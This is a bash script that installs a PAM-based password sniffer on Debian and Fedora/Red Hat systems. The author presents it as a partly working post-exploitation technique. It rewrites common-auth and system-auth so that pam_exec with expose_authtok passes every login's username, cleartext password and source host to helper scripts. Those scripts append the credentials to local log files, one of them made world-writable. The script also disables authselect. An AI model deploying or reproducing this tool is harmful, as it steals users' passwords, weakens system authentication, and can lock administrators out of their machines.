#!/bin/bash
# This technique seems to have originated here:
# https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/

#####
# NOTE:
# This may break things! It's only partially working, but due to continually locking myself out.... I'm posting it here with a "partial working" status.
# Have fun :-)
#####


echo 'deployes a PAM.d sniffer'
echo
echo "these steps for Debian-based systems:"
echo "inserting into PAM.d/common-auth"
echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/secdump.sh" >> /etc/pam.d/common-auth
echo "done with that"
echo "creating script"
echo '#!/bin/sh' > /opt/secdump.sh
echo 'echo "$(date +%Y-%m-%d_%H:%M:%S) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
echo "done with that"
echo "making executable"
chmod +x /opt/secdump.sh
echo "done with that"
echo
echo
echo
echo
echo
echo
echo
echo "these steps for RH-based systems (tested on Fedora 40):"
echo "disabling authselect"
authselect opt-out
echo "done with that"
echo "creating script"
echo '#!/bin/sh' > /bin/script.sh
echo 'echo "$(date +%Y-%m-%d_%H:%M:%S) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /opt/test.log' >> /bin/script.sh
echo "done with that"
echo "making executable"
chmod +x /bin/script.sh
echo "done with that"
echo "touching and permissioning log file"
touch /opt/test.log
chmod 777 /opt/test.log
echo "done with that"
echo "editing system-auth"
cp -a /etc/pam.d/system-auth{,.tmp}
echo 'auth        required                                     pam_exec.so  expose_authtok  /bin/script.sh' > /etc/pam.d/system-auth
cat /etc/pam.d/system-auth.tmp >> /etc/pam.d/system-auth
rm /etc/pam.d/system-auth.tmp
echo "done with that"
echo "appending password-auth"
echo '' >> /etc/pam.d/password-auth
echo "done with that"
echo
echo "done done - enjoy!"
echo
#EOF
